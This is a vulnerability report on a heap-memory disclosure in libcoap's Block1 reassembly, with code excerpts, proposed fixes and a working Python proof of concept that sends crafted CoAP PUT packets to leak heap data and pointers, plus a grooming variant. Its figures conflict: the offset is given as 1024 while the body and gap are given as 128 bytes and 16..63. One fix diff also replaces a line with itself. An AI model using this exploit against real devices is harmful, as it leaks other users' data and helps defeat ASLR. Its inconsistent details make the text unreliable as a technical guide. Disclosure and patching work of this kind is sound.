╭─ VULN-0004 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Uninitialised heap memory disclosed through re-assembled Block1      │
│  body when the block size grows mid-transfer                                 │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.3                                                             │
│                                                                              │
│  Target: libcoap 4.3.5 (source snapshot), src/coap_block.c                   │
│                                                                              │
│  Endpoint: CoAP Block1 transfer reassembly (server side), UDP/TCP port 5683  │
│                                                                              │
│  Method: CoAP (PUT with Block1 option)                                       │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  `libcoap` re-assembles a Block1 request body into a heap buffer but never   │
│  initialises the bytes the client did not send. A client can force such a    │
│  gap by increasing the SZX (block size) between blocks: the write offset of  │
│  the next block is computed from the new SZX (`num << (szx + 4)`), so it     │
│  jumps past the data already received, while the received-block bookkeeping  │
│  still treats the transfer as complete. The application is then handed a     │
│  body of `total_len` bytes in which the gap holds whatever was previously    │
│  in that heap memory. With the example server's echo mode the leaked bytes   │
│  are returned to the client in the 2.01 response.                            │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated client that can send UDP or TCP CoAP requests obtains    │
│  heap contents it never supplied: on a non-sanitised build, 38 of 40         │
│  attempts returned previously freed request payloads and heap/library        │
│  pointers inside the 2.01 response body, and the same buffer is handed to    │
│  any application using `COAP_BLOCK_SINGLE_BODY` or the public                │
│  `coap_block_build_body()` helper. The leaked region is attacker-sized (up   │
│  to the configured maximum body size) and repeatable, so it can be used to   │
│  read freed heap data such as other peers' request payloads and pointer      │
│  values that help defeat ASLR. Integrity and availability are not affected   │
│  by the PoC.                                                                 │
│                                                                              │
│  Technical Analysis                                                          │
│  Two library routines combine to produce the disclosure.                     │
│                                                                              │
│  **1. Offset derived from the per-request SZX.** In                          │
│  `coap_handle_request_put_block()` the transfer's block size is recorded     │
│  once, when the reassembly state (`lg_srcv`) is created:                     │
│                                                                              │
│  ```c title=src/coap_block.c startLineNumber=3693 endLineNumber=3697         │
│      max_block_szx = COAP_BLOCK_MAX_SIZE_GET(session->block_mode);           │
│      if (!block.bert && block.num == 0 && max_block_szx != 0 &&              │
│          max_block_szx < block.szx) {                                        │
│        lg_srcv->szx = max_block_szx;                                         │
│      } else {                                                                │
│        lg_srcv->szx = block.szx;                                             │
│      }                                                                       │
│  ```                                                                         │
│                                                                              │
│  but the offset of every block is computed from the SZX carried in that      │
│  individual request:                                                         │
│                                                                              │
│  ```c title=src/coap_block.c startLineNumber=3601 endLineNumber=3601         │
│    offset = block.num << (block.szx + 4);                                    │
│  ```                                                                         │
│                                                                              │
│  and again while marking the logical blocks as received:                     │
│                                                                              │
│  ```c title=src/coap_block.c startLineNumber=3787 endLineNumber=3790         │
│      block.num++;                                                            │
│      offset = block.num << (block.szx + 4);                                  │
│  ```                                                                         │
│                                                                              │
│  Nothing checks that `block.szx` still equals the established                │
│  `lg_srcv->szx`, so a request sequence of `NUM=0/SZX=0` (16 bytes at offset  │
│  0) followed by `NUM=1/SZX=6` (1024 bytes at offset 1024) is accepted.       │
│  `blocks_add_entry()` records NUM 0 and NUM 1, `check_all_blocks_in()`       │
│  therefore reports the transfer as complete, and the body is passed to the   │
│  application with `body_length = lg_srcv->total_len` (2048 in the example),  │
│  although offsets 16..1023 were never written. RFC 7959 2.2/2.4 only         │
│  permits the server to reduce the block size and requires the NUM/offset     │
│  mapping to stay consistent, so this sequence is exactly the kind of         │
│  malformed input a parser must reject.                                       │
│                                                                              │
│  **2. New buffer space is not initialised.** `coap_block_build_body_lkd()`   │
│  allocates the body with `coap_new_binary()`, which allocates                │
│  `sizeof(coap_str_bin_union_t) + size` bytes and does not clear the data     │
│  area, then only `memcpy()`s the bytes of the current block into it:         │
│                                                                              │
│  ```c title=src/coap_block.c startLineNumber=4594 endLineNumber=4596         │
│    if (body_data == NULL && total) {                                         │
│      body_data = coap_new_binary(total);                                     │
│    }                                                                         │
│  ...                                                                         │
│      coap_binary_t *new = coap_resize_binary(body_data, offset + length);    │
│      if (new) {                                                              │
│        body_data = new;                                                      │
│        memcpy(&body_data->s[offset], data, length);                          │
│  ```                                                                         │
│                                                                              │
│  The same function is public (`coap_block_build_body()`) and is the          │
│  documented way for applications to re-assemble a body, so applications      │
│  outside the library inherit the same uninitialised bytes. In the shipped    │
│  example server the `-L 1` (default, application re-assembly) path uses      │
│  this helper, and the `-L 3` (`COAP_BLOCK_SINGLE_BODY`) path receives the    │
│  library's `lg_srcv->body_data` directly as `pdu->body_data`, so both        │
│  configurations are affected.                                                │
│                                                                              │
│  The combination is confirmed by ASan, which reports the gap as its own      │
│  uninitialised-malloc pattern (`0xbe`), and by a plain `RelWithDebInfo`      │
│  build, which returns previously freed payloads and pointer values.          │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the shipped example server with echo mode and library-side         │
│  single-body re-assembly on a loopback port: `coap-server -A 127.0.0.1 -p    │
│  15689 -e -d 10 -L 3`.                                                       │
│  2. From a single UDP socket (so both requests belong to the same session),  │
│  send a Block1 PUT to `/test` with `NUM=0`, `SZX=0` (16 bytes), `M=1` and a  │
│  16-byte payload. The server answers 2.31 Continue with `Block1:0/M/16`.     │
│  3. From the same socket send the final block with `NUM=1`, `SZX=6`          │
│  (1024-byte block unit), `M=0` and a 64-byte payload. The offset of this     │
│  block is computed as 1 << 10 = 1024 while the first block ended at 16.      │
│  4. The server answers 2.01 Changed. Because `-e` is set, the response body  │
│  is the re-assembled 128-byte body with the block option removed.            │
│  5. Observe that bytes 16..63 of the response body were never sent by the    │
│  client. On an ASan build they contain the allocator's `0xbe` uninitialised  │
│  pattern; on a normal build they contain stale heap data (see the grooming   │
│  variant below).                                                             │
│  6. Repeat steps 2-3 after a completed 128-byte transfer of a known          │
│  pattern: previously freed payload bytes and pointer values appear in the    │
│  gap in most attempts.                                                       │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  # Minimal PoC: Block1 transfer whose SZX grows between blocks leaves a      │
│  hole in                                                                     │
│  # the re-assembled body that is returned to the client.                     │
│  import socket, subprocess, time                                             │
│                                                                              │
│  HOST, PORT = "127.0.0.1", 15689                                             │
│  srv = subprocess.Popen(["/workspace/build-tests/coap-server", "-A", HOST,   │
│                          "-p", str(PORT), "-e", "-d", "10", "-L", "3"],      │
│                         stdout=subprocess.DEVNULL,                           │
│  stderr=subprocess.STDOUT)                                                   │
│  time.sleep(1.5)                                                             │
│                                                                              │
│  def nib(v):                                                                 │
│      if v < 13:                                                              │
│          return v, b""                                                       │
│      if v < 269:                                                             │
│          return 13, bytes([v - 13])                                          │
│      return 14, b"\x00" + bytes([v - 269])                                   │
│                                                                              │
│  def opt(delta, value):                                                      │
│      dn, dext = nib(delta)                                                   │
│      lnb, lext = nib(len(value))                                             │
│      return bytes([(dn << 4) | lnb]) + dext + lext + value                   │
│                                                                              │
│  def put_block(num, szx, more, payload, tok, mid):                           │
│      hdr = bytes([0x40 | len(tok), 0x03, mid >> 8, mid & 0xff])              │
│      body = tok + opt(11, b"test") + opt(1, b"")           # Uri-Path,       │
│  Content-Format                                                              │
│      body += opt(15, bytes([(num << 4) | (more << 3) | szx]))  # Block1      │
│      return hdr + body + b"\xff" + payload                                   │
│                                                                              │
│  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                        │
│  s.settimeout(1.0)                                                           │
│  tok = b"\x11\x22\x33\x44"                                                   │
│                                                                              │
│  s.sendto(put_block(0, 0, 1, b"A" * 16, tok, 0x1001), (HOST, PORT))   #      │
│  16-byte block, M=1                                                          │
│  print("block0:", s.recvfrom(65535)[0].hex())                                │
│                                                                              │
│  s.sendto(put_block(1, 6, 0, b"B" * 64, tok, 0x1002), (HOST, PORT))   #      │
│  offset 1024, M=0                                                            │
│  resp = s.recvfrom(65535)[0]                                                 │
│  print("block1:", resp.hex())                                                │
│                                                                              │
│  tkl = resp[0] & 0x0f                                                        │
│  payload = resp[4 + tkl:].split(b"\xff", 1)[1]                               │
│  print("body[0:16]  =", payload[0:16])                                       │
│  print("body[16:64] =", payload[16:64].hex())   # never sent by the client   │
│  print("body[64:80] =", payload[64:80])                                      │
│  srv.terminate()                                                             │
│  ```                                                                         │
│                                                                              │
│  Grooming variant used to show real heap contents on a non-sanitised build:  │
│  perform a completed 128-byte Block1 transfer of a known pattern first,      │
│  then repeat the two requests above 40 times; 38 of 40 responses contained   │
│  non-zero gap bytes, e.g. `4343434343434343...` (the previous transfer's     │
│  payload) and `a09600a8247f0000` (a stack/libc pointer).                     │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: src/coap_block.c:3717                                         │
│    Reject an SZX change once the transfer's block size is established        │
│      lg_srcv_is_refed = 1;                                                   │
│    Fix:                                                                      │
│    -   lg_srcv_is_refed = 1;                                                 │
│    +   lg_srcv_is_refed = 1;                                                 │
│                                                                              │
│    /*                                                                        │
│     * The SZX (block size) defines the NUM to offset mapping, so it cannot   │
│  be                                                                          │
│     * changed part way through a reassembled transfer.  A larger SZX makes   │
│  the                                                                         │
│     * offset of the next NUM jump past the data already received, leaving a  │
│  gap                                                                         │
│     * in the body that is never filled in but is still reported to the       │
│     * application as part of the body.  A compliant client keeps using the   │
│  SZX                                                                         │
│     * that was returned in the 2.31 response.                                │
│     */                                                                       │
│    if (!block.bert && block.num != 0 && block.szx != lg_srcv->szx) {         │
│      coap_add_data(response, sizeof("Block size change")-1,                  │
│                    (const uint8_t *)"Block size change");                    │
│      response->code = COAP_RESPONSE_CODE(408);                               │
│      goto free_lg_srcv;                                                      │
│    }                                                                         │
│                                                                              │
│    Location 2: src/coap_block.c:4594-4596                                    │
│    Zero the newly allocated body buffer                                      │
│      if (body_data == NULL && total) {                                       │
│      body_data = coap_new_binary(total);                                     │
│    }                                                                         │
│    Fix:                                                                      │
│    -   if (body_data == NULL && total) {                                     │
│      body_data = coap_new_binary(total);                                     │
│    }                                                                         │
│    +   if (body_data == NULL && total) {                                     │
│      body_data = coap_new_binary(total);                                     │
│      if (body_data)                                                          │
│        memset(body_data->s, 0, body_data->length);                           │
│    }                                                                         │
│                                                                              │
│    Location 3: src/coap_block.c:4620-4624                                    │
│    Zero the tail added when the body grows                                   │
│        coap_binary_t *new = coap_resize_binary(body_data, offset + length);  │
│                                                                              │
│      if (new) {                                                              │
│        body_data = new;                                                      │
│        memcpy(&body_data->s[offset], data, length);                          │
│    Fix:                                                                      │
│    -     coap_binary_t *new = coap_resize_binary(body_data, offset +         │
│  length);                                                                    │
│                                                                              │
│      if (new) {                                                              │
│        body_data = new;                                                      │
│        memcpy(&body_data->s[offset], data, length);                          │
│    +     size_t old_length = body_data->length;                              │
│      coap_binary_t *new = coap_resize_binary(body_data, offset + length);    │
│                                                                              │
│      if (new) {                                                              │
│        body_data = new;                                                      │
│        if (body_data->length > old_length)                                   │
│          memset(&body_data->s[old_length], 0, body_data->length -            │
│  old_length);                                                                │
│        memcpy(&body_data->s[offset], data, length);                          │
│                                                                              │
│  Remediation                                                                 │
│  Reject a Block1/Q-Block1 request whose SZX differs from the block size      │
│  already established for that transfer (except for the first block),         │
│  because the NUM to offset mapping of an in-progress transfer is fixed and   │
│  a size increase leaves a gap that is never filled. Additionally, never      │
│  expose never-written bytes: zero the body buffer when it is created and     │
│  zero the newly added tail whenever the body is grown, so that a gap is      │
│  defined data rather than heap contents. Both changes are needed — the       │
│  first enforces the RFC 7959 block-sequence rule, the second guarantees the  │
│  "every byte of the delivered body was either supplied by the client or is   │
│  zero" invariant for any future path that computes an offset.                │
│                                                                              │
